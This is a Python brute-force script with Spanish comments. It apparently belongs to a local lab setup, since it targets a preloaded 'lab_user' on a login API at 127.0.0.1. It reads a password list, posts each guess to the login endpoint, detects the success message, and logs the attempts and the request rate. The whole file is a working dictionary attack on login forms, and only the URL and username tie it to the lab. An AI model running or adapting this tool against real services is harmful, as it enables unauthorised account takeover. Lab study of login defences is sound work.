import requests
import time
import sys
import json # Necesario para parsear la respuesta JSON

# --- Configuración del Ataque ---
TARGET_URL = "http://127.0.0.1:8000/login"
TARGET_USERNAME = "lab_user"  # Coincide con el usuario precargado en main.py
PASSWORD_FILE = "passwords.txt"
SUCCESS_MESSAGE = "Login exitoso"
LOG_FILE = "brute_force_results.log"

def run_attack():
    # Inicialización y Medición
    start_time = time.time()
    attempts = 0
    
    with open(LOG_FILE, 'w') as log:
        log.write(f"--- Iniciando Prueba de Fuerza Bruta contra {TARGET_USERNAME} ---\n")

    print(f"--- Iniciando Ataque de Fuerza Bruta contra {TARGET_USERNAME} ---")
    
    try:
        with open(PASSWORD_FILE, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Error: No se encontró el archivo de contraseñas: {PASSWORD_FILE}")
        return

    # Bucle del Ataque
    for password in passwords:
        attempts += 1
        payload = {"username": TARGET_USERNAME, "password": password}
        
        try:
            # 1. Enviar solicitud POST
            response = requests.post(TARGET_URL, json=payload)
            response_json = response.json()
            
            # 2. Verificar el mensaje de éxito
            if response_json.get("message") == SUCCESS_MESSAGE:
                duration = time.time() - start_time
                rate = attempts / duration if duration > 0 else attempts
                
                # Reporte final en consola y log
                report = f"\n==================================================\n"
                report += f"¡ÉXITO! Intento {attempts}: Contraseña Encontrada: '{password}'\n"
                report += f"Intentos Totales: {attempts}\n"
                report += f"Duración: {duration:.2f} segundos\n"
                report += f"Tasa: {rate:.2f} peticiones/segundo (PPS)\n"
                report += f"==================================================\n"
                
                print(report)
                with open(LOG_FILE, 'a') as log:
                    log.write(report)
                return

        except requests.exceptions.RequestException as e:
            print(f"\nError de conexión: {e}. Asegúrate que la API está corriendo en {TARGET_URL}.")
            sys.exit(1)

        # Registro de intentos fallidos (opcionalmente)
        log_line = f"Intento {attempts} fallido: Probó '{password}'\n"
        with open(LOG_FILE, 'a') as log:
            log.write(log_line)
            
        # Muestra el progreso en la consola
        sys.stdout.write(f"\rIntentos: {attempts} - Probando: {password}")
        sys.stdout.flush()

    # Si se termina el diccionario sin éxito
    duration = time.time() - start_time
    print(f"\n--- Ataque Finalizado ---\nContraseña no encontrada en el diccionario después de {attempts} intentos ({duration:.2f}s).")

if __name__ == "__main__":
    run_attack()